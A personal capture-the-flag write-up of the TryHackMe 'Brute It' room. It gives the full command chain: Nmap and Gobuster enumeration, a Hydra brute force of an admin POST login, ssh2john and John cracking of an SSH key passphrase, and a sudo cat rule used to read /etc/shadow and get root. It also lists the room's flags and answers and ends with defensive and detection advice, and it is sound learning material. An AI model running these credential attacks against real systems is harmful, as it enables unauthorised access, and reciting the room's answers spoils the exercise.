# TryHackMe – Brute It

**Date completed:** 10 November 2026  
**Platform:** TryHackMe  
**Target IP during this session:** `10.49.183.26`  
**Attacking machine:** Kali Linux  
**Tools:** Nmap, Gobuster, curl, Hydra, John the Ripper, `ssh2john`, SSH, Linux utilities

---

## 1. Introduction

In this room, I practised a complete web-to-Linux attack path. I started with network enumeration, discovered a hidden admin directory, inspected its HTML source, and used Hydra to identify the admin password. I then obtained an encrypted RSA private key, cracked its passphrase with John the Ripper, and used the key to log in over SSH as `john`.

After gaining a foothold, I enumerated Linux privileges and discovered that `john` could execute `/bin/cat` as root without a password. I used this sudo misconfiguration to read `/etc/shadow`, then successfully switched to root and retrieved the root flag.

This room connected several important techniques:

1. Network and service enumeration.
2. Web directory discovery.
3. HTML source inspection and information disclosure.
4. HTTP POST form testing with Hydra.
5. SSH private-key passphrase cracking.
6. SSH authentication with a private key.
7. Linux privilege enumeration.
8. Sudo misconfiguration discovery.
9. Access to protected files and root access.

> **Authorization:** These techniques were performed against the assigned TryHackMe lab machine. Password attacks, credential testing, and privilege escalation must only be performed on systems where I have explicit authorization.

---

## 2. Lab information

| Item | Value |
|---|---|
| Platform | TryHackMe |
| Room | Brute It |
| Target IP | `10.49.183.26` |
| SSH | TCP/22 |
| HTTP | TCP/80 |
| Web server | Apache httpd 2.4.29 (Ubuntu) |
| SSH server | OpenSSH 7.6p1 Ubuntu |
| Attacking machine | Kali Linux |

The target IP belongs to this particular lab session and may change when the machine is restarted.

---

## 3. Task 1 – Network and service enumeration

I started by identifying the target's open ports and running services.

```bash
nmap -sCV 10.49.183.26
```

### Command breakdown

| Option | Meaning |
|---|---|
| `nmap` | Network scanning and service enumeration tool |
| `-sC` | Runs Nmap's default scripts |
| `-sV` | Attempts to identify service versions |
| `10.49.183.26` | Target IP address |

### Results

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.29 (Ubuntu) |

The HTTP title was:

```text
Apache2 Ubuntu Default Page: It works
```

### My observations

- Port 22 indicated that SSH was available. I kept this in mind for a possible later login.
- Port 80 showed that a web server was running.
- The default Apache page did not reveal the actual application, so I moved on to web content discovery.

**What I learned:** Enumeration helps establish the exposed attack surface before I choose what to investigate next.

---

## 4. Task 2 – Discovering hidden directories with Gobuster

I used Gobuster to discover directories and files that were not linked from the default page.

```bash
gobuster dir -u http://10.49.183.26 -w /usr/share/wordlists/dirb/common.txt
```

### Command breakdown

| Argument | Meaning |
|---|---|
| `gobuster` | Directory and file enumeration tool |
| `dir` | Directory enumeration mode |
| `-u` | Target URL |
| `-w` | Wordlist to use |
| `common.txt` | Common directory and filename candidates |

### Relevant output

```text
admin                (Status: 301) [Size: 312] [--> http://10.49.183.26/admin/]
index.html           (Status: 200) [Size: 10918]
```

Other standard Apache paths appeared with `403 Forbidden` responses.

### Understanding the status codes

- `200 OK`: The requested resource was accessible.
- `301 Moved Permanently`: The server redirected the request. Here, `/admin` redirected to `/admin/`.
- `403 Forbidden`: The server understood the request but refused access.
- `404 Not Found`: The requested resource was not found.

The important discovery was:

```text
/admin/
```

I opened:

```text
http://10.49.183.26/admin/
```

This revealed an admin login page.

**What I learned:** Directory enumeration can reveal application functionality that is not linked from the website's landing page.

---

## 5. Task 3 – Inspecting the admin page and discovering the username

I used curl to inspect the HTTP response, including its headers and HTML body.

```bash
curl -i http://10.49.183.26/admin/
```

The response included:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=...
```

The HTML contained this form:

```html
<form action="" method="POST">
    <h1>LOGIN</h1>
    <label>USERNAME</label>
    <input type="text" name="user">
    <label>PASSWORD</label>
    <input type="password" name="pass">
    <button type="submit">LOGIN</button>
</form>
```

### Important HTML comment

At the bottom of the page source, I found:

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

This disclosed the admin username:

```text
admin
```

### Why this matters

HTML comments are not normally displayed on the page, but they are included in the HTML source sent to the browser. Developers may accidentally leave internal notes, usernames, test credentials, or other information in comments.

This is an example of **information disclosure**. The comment did not give me the password, but it provided a username to test.

### Login form details

| Property | Value |
|---|---|
| HTTP method | POST |
| Username parameter | `user` |
| Password parameter | `pass` |
| Discovered username | `admin` |
| Form action | Current page (`action=""`) |

I needed these parameter names to construct the correct Hydra request.

---

## 6. Task 4 – Finding the admin password with Hydra

### 6.1 My initial attempt

I first tried:

```bash
hydra -L users.txt -P passwords.txt 10.49.183.26 http-get /admin/
```

Hydra returned:

```text
[ERROR] File for logins not found: users.txt
```

There were two issues:

1. `users.txt` and `passwords.txt` were not present in my current working directory.
2. The page used a normal HTML POST form, not HTTP Basic Authentication. Therefore, `http-get` was not the right module.

### 6.2 Understanding the POST request

The HTML form showed:

```html
<input type="text" name="user">
<input type="password" name="pass">
```

The form parameters were therefore `user` and `pass`.

I also sent a test POST request using curl:

```bash
curl -i -X POST http://10.49.183.26/admin/ \
-d "user=admin&pass=wrongpassword"
```

This helped inspect how the application responded to an incorrect login.

### 6.3 Hydra command that worked

I used the known username and the RockYou wordlist:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.183.26 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Invalid"
```

### Command breakdown

| Argument | Meaning |
|---|---|
| `hydra` | Online login testing tool |
| `-l admin` | Uses the known username `admin` |
| `-P` | Specifies a password wordlist |
| `/usr/share/wordlists/rockyou.txt` | Password candidates |
| `10.49.183.26` | Target host |
| `http-post-form` | Tests an HTTP POST login form |
| `/admin/` | Login page path |
| `user=^USER^` | Hydra substitutes the username |
| `pass=^PASS^` | Hydra substitutes each password |
| `F=Invalid` | Treats a response containing `Invalid` as a failed login |

The failure string must match the application's actual failed-login response. If the application uses a different message, the failure condition must be adjusted.

### 6.4 Hydra result

Hydra returned:

```text
[80][http-post-form] host: 10.49.183.26
login: admin
password: xavier

1 of 1 target successfully completed, 1 valid password found
```

The credentials were:

```text
Username: admin
Password: xavier
```

### What I learned

Hydra needs more than a target URL when testing an HTML login form. I must identify the HTTP method, endpoint, form parameter names, and a reliable failure condition.

The initial error also reminded me to check that wordlist files exist at the paths I specify.

---

## 7. Task 5 – Obtaining John's encrypted RSA private key

After discovering the admin credentials, I inspected the admin area and obtained an RSA private key.

The key began with:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
```

The important line was:

```text
Proc-Type: 4,ENCRYPTED
```

This indicated that the private key was encrypted and required a passphrase before it could be used.

### What is an RSA private key?

RSA is a public-key cryptographic algorithm that uses a key pair:

- **Public key:** Can be shared and is used to verify the corresponding private key.
- **Private key:** Must be protected. It is used by its owner to prove possession of the key.

SSH can use public-key authentication instead of a normal account password. A private key may itself be encrypted with a passphrase, adding protection if someone obtains a copy of the file.

### Saving the key

I saved the complete key on Kali:

```bash
nano id_rsa
```

I pasted the complete key, including the `BEGIN` and `END` boundary lines, and saved it as:

```text
id_rsa
```

**Security note:** Private keys are sensitive authentication material. They should never be committed to a public GitHub repository or shared in an untrusted location. I have documented the process without including the private key contents.

---

## 8. Task 6 – Cracking the RSA passphrase with John the Ripper

### 8.1 Converting the key with ssh2john

John the Ripper needs the encrypted SSH key in a format it can process. The `ssh2john` utility extracts the required information.

```bash
ssh2john id_rsa > rsa_hash.txt
```

This created the file:

```text
rsa_hash.txt
```

### 8.2 Running John

I used the RockYou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash.txt
```

### Command breakdown

| Argument | Meaning |
|---|---|
| `john` | John the Ripper password-auditing tool |
| `--wordlist=...` | Uses the specified wordlist |
| `rsa_hash.txt` | Contains the converted encrypted-key hash |

John tested candidate passphrases against the encrypted private key.

### 8.3 Result

John reported:

```text
rockinroll       (id_rsa)
1g ... DONE
1 password hash cracked, 0 left
```

I verified the result:

```bash
john --show rsa_hash.txt
```

Output:

```text
id_rsa:rockinroll

1 password hash cracked, 0 left
```

The RSA private-key passphrase was:

```text
rockinroll
```

### What I learned

This was an offline password-cracking exercise against the passphrase protecting an SSH private key. `ssh2john` converted the key into a format John could process, and John tested candidates from the wordlist.

A weak passphrase can make a stolen encrypted private key vulnerable to offline guessing.

---

## 9. Task 7 – SSH login as John

After recovering the passphrase, I prepared the private key for SSH use.

### 9.1 Setting file permissions

```bash
chmod 600 id_rsa
```

This gives the file read and write permissions for its owner only. SSH may refuse to use a private key if its permissions are too open.

### 9.2 Connecting to the target

```bash
ssh -i id_rsa john@10.49.183.26
```

| Argument | Meaning |
|---|---|
| `ssh` | Secure Shell client |
| `-i id_rsa` | Uses the specified private key |
| `john` | Remote account username |
| `10.49.183.26` | Target IP |

When prompted, I entered the private-key passphrase:

```text
rockinroll
```

I successfully authenticated and reached:

```text
john@bruteit:~$
```

### Why did I use `john` as the SSH username?

The room question referred to **John's RSA private key**, which gave me a clue that the associated account might be `john`. This was an inference from the lab wording, not something discovered in the initial curl request.

The successful SSH login verified that `john` was a valid account for the key.

This is a useful distinction:

- **Observation:** The lab refers to John's RSA private key.
- **Inference:** The associated SSH account may be `john`.
- **Verification:** SSH authentication succeeds as `john`.

---

## 10. Retrieving the user flag

After logging in, I checked my identity:

```bash
whoami
```

Output:

```text
john
```

I listed the home directory:

```bash
ls
```

It contained:

```text
user.txt
```

I read the file:

```bash
cat user.txt
```

Output:

```text
THM{a_password_is_not_a_barrier}
```

**User flag:**

```text
THM{a_password_is_not_a_barrier}
```

I also checked my working directory:

```bash
pwd
```

Output:

```text
/home/john
```

Then I inspected the directory permissions:

```bash
ls -la
```

The `user.txt` file was shown as owned by root but readable by other users:

```text
-rw-r--r-- 1 root root ... user.txt
```

This explains why John could read it. The permission bits allowed read access to users other than the owner.

---

## 11. Task 8 – Linux privilege enumeration

After obtaining access as `john`, I began checking the account's privileges.

### 11.1 Confirming the current account

```bash
whoami
```

Output:

```text
john
```

### 11.2 Checking UID, GID, and groups

```bash
id
```

Output:

```text
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
```

This showed:

- UID `1001`: John's user ID.
- GID `1001`: John's primary group ID.
- Group `sudo`: John was a member of the sudo group.

Group membership alone does not tell me exactly which commands the account can execute with elevated privileges. I needed to inspect the sudo policy.

### 11.3 Checking sudo permissions

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=...

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

### 11.4 Understanding the sudo rule

The important line was:

```text
(root) NOPASSWD: /bin/cat
```

It meant:

- `(root)`: John could execute the permitted command as root.
- `NOPASSWD`: Sudo did not require John's password for this command.
- `/bin/cat`: The permitted executable was the `cat` utility.

This was a serious sudo misconfiguration because `cat` can read files. Running it as root allowed John to read files that would normally be restricted to the root account.

**Security lesson:** Sudo permissions should follow the principle of least privilege. Granting a low-privileged account access to a powerful command as root can expose sensitive system information.

---

## 12. Task 9 – Reading `/etc/shadow`

Linux stores local account password hashes and password-aging information in:

```text
/etc/shadow
```

Ordinary users generally cannot read this file. It is protected because password hashes should not be exposed to unprivileged accounts.

I used the sudo permission I had discovered:

```bash
sudo /bin/cat /etc/shadow
```

The command successfully displayed the file.

### Understanding the root entry

The root entry began with:

```text
root:$6$...
```

The `$6$` prefix identifies the SHA-512 crypt password-hashing format.

The file contains colon-separated fields, including the password hash and password-aging information.

### Hash versus plaintext password

The value stored in `/etc/shadow` is a password hash, not the plaintext password. A tool such as John the Ripper can test candidate passwords offline against the hash.

During this session, I obtained the root hash from `/etc/shadow`, but the recorded transcript does **not** show a successful John the Ripper result for that root hash. I therefore do not claim that I cracked the root hash through the documented process.

---

## 13. Obtaining root access

After reading `/etc/shadow`, I ran:

```bash
su root
```

The system prompted:

```text
Password:
```

The session then changed to:

```text
root@bruteit:/home#
```

I verified the account:

```bash
whoami
```

Output:

```text
root
```

This confirmed that I had obtained a root shell.

### Evidence note about the root password

The terminal transcript preserved the successful `su root` transition, but it did not preserve the password entered at the prompt. The root hash was obtained, but a successful cracking result was not captured in the conversation.

Therefore, the exact plaintext root password is **not recorded in this write-up**. I should verify the room's requested root-password answer from my actual lab result rather than inventing it.

---

## 14. Retrieving the root flag

Once I had root access, I checked the root home directory:

```bash
cd ~
ls
```

It contained:

```text
root.txt
```

I read the flag:

```bash
cat root.txt
```

Output:

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

**Root flag:**

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

This confirmed that I had accessed the root account and retrieved the root flag.

---

## 15. Attack path summary

```text
Nmap enumeration
      |
      v
Open ports: 22 (SSH), 80 (HTTP)
      |
      v
Gobuster directory enumeration
      |
      v
Discovered /admin/
      |
      v
Inspected HTML source
      |
      v
Found username: admin
      |
      v
Identified POST fields: user and pass
      |
      v
Hydra tested the password wordlist
      |
      v
Admin password discovered: xavier
      |
      v
Obtained encrypted RSA private key
      |
      v
ssh2john converted key for John
      |
      v
John cracked key passphrase: rockinroll
      |
      v
SSH login as john
      |
      v
Retrieved user.txt
      |
      v
sudo -l revealed NOPASSWD: /bin/cat as root
      |
      v
Read /etc/shadow using sudo
      |
      v
su root succeeded
      |
      v
Retrieved root.txt
```

---

## 16. Commands reference

### Reconnaissance

```bash
nmap -sCV 10.49.183.26
```

### Web directory discovery

```bash
gobuster dir -u http://10.49.183.26 -w /usr/share/wordlists/dirb/common.txt
```

### Inspect the admin page

```bash
curl -i http://10.49.183.26/admin/
```

### Test the POST response

```bash
curl -i -X POST http://10.49.183.26/admin/ \
-d "user=admin&pass=wrongpassword"
```

### Hydra form testing

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.183.26 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Invalid"
```

### Convert the SSH key for John

```bash
ssh2john id_rsa > rsa_hash.txt
```

### Crack the key passphrase

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash.txt
```

### Display the recovered passphrase

```bash
john --show rsa_hash.txt
```

### Set key permissions

```bash
chmod 600 id_rsa
```

### SSH login

```bash
ssh -i id_rsa john@10.49.183.26
```

### Linux enumeration

```bash
whoami
pwd
ls -la
id
groups
sudo -l
```

### Read the user flag

```bash
cat ~/user.txt
```

### Read the shadow file using the sudo permission

```bash
sudo /bin/cat /etc/shadow
```

### Switch to root and verify

```bash
su root
whoami
```

### Read the root flag

```bash
cat /root/root.txt
```

---

## 17. Findings and security lessons

| Finding | Security impact | Lesson |
|---|---|---|
| Hidden `/admin/` directory | Exposed an administrative login page | Directory discovery can reveal application attack surface |
| Username in HTML comment | Information disclosure | Do not leave internal notes in client-side source |
| Weak admin password | Password guessing identified valid credentials | Use strong, unique passwords and rate limiting |
| Private key protected by a weak passphrase | Wordlist attack recovered the passphrase | Protect private keys with strong passphrases |
| Sudo allowed root execution of `/bin/cat` without a password | Allowed access to root-protected files | Apply least privilege and audit sudoers rules |
| Sensitive hashes readable through the sudo rule | Enabled offline password auditing | Restrict access to `/etc/shadow` |

---

## 18. Defensive recommendations

### 18.1 Web application security

- Remove internal usernames and operational notes from HTML comments.
- Avoid exposing administrative interfaces unnecessarily.
- Use strong, unique passwords and multi-factor authentication where possible.
- Apply rate limiting and monitoring to login endpoints.
- Use secure session handling and protect session cookies.

### 18.2 SSH security

- Protect private keys with strong passphrases.
- Store private keys with restrictive file permissions.
- Never commit private keys to public repositories.
- Monitor authentication failures and unusual SSH access.
- Disable password authentication where key-based authentication is properly deployed and operationally supported.

### 18.3 Linux privilege security

- Follow the principle of least privilege when configuring sudo.
- Avoid granting broad access to commands that can read or modify arbitrary files.
- Review sudo permissions regularly.
- Protect `/etc/shadow` and other sensitive system files.
- Monitor unexpected use of `sudo`, `su`, and privileged commands.

### 18.4 SOC detection opportunities

| Activity | Potential telemetry or detection |
|---|---|
| Web directory enumeration | Web logs showing repeated requests for common paths |
| Repeated login attempts | Authentication logs showing many failures against one account |
| Successful login after failures | Correlate failed and successful authentication events |
| SSH access | SSH logs containing source IP, account, and login time |
| Sudo misuse | Audit logs showing unusual privileged command execution |
| Access to `/etc/shadow` | File-access auditing and process execution telemetry |
| Root shell creation | Correlate `su`, sudo activity, and privileged process execution |

These are investigation leads, not standalone proof of malicious activity. A SOC analyst should correlate events with expected host behavior, user identity, source address, and surrounding process activity.

---

## 19. Flags and answers recorded

| Objective | Recorded value |
|---|---|
| Hidden web directory | `/admin/` |
| Admin username | `admin` |
| Admin password | `xavier` |
| SSH account | `john` |
| RSA private-key passphrase | `rockinroll` |
| User flag | `THM{a_password_is_not_a_barrier}` |
| Sudo privilege | `(root) NOPASSWD: /bin/cat` |
| Root flag | `THM{pr1v1l3g3_3sc4l4t10n}` |
| Root plaintext password | Not preserved in the terminal transcript |
| Web flag | Not captured in the available session notes |

**Important documentation note:** I successfully switched to root with `su root`, but the password entered at the prompt was not included in the recorded terminal output. I also did not preserve a successful John result for the root hash. I have deliberately left the plaintext root password unreported rather than guessing.

The available session transcript records the user and root flags, but not a separate web flag. I have left it unreported rather than inventing a value.

---

## 20. What I learned

This room gave me practical experience with a multi-stage attack chain rather than one isolated tool.

I learned that reconnaissance is the foundation of the process. Nmap helped me identify exposed services, and Gobuster revealed a hidden administrative path. Inspecting the HTML source exposed a username that was not visible in the normal page interface.

I also learned that Hydra must be configured according to the actual authentication mechanism. My first command failed because the wordlist files were not present and because the target used a POST form rather than HTTP Basic Authentication. By inspecting the HTML form, I identified the correct parameter names and used the appropriate Hydra module.

The SSH stage helped me understand private-key authentication and why an encrypted private key still needs a strong passphrase. `ssh2john` converted the key into a format John could process, and John recovered the passphrase from the wordlist.

Finally, the privilege-escalation stage showed me why sudo permissions must be reviewed carefully. Allowing a user to run a command as root without a password can expose sensitive files if that command has broader capabilities than intended.

The biggest lesson was to verify each stage instead of assuming that one discovery automatically proves the next. I used the lab evidence to move from web enumeration to credential discovery, SSH access, privilege enumeration, and root access.


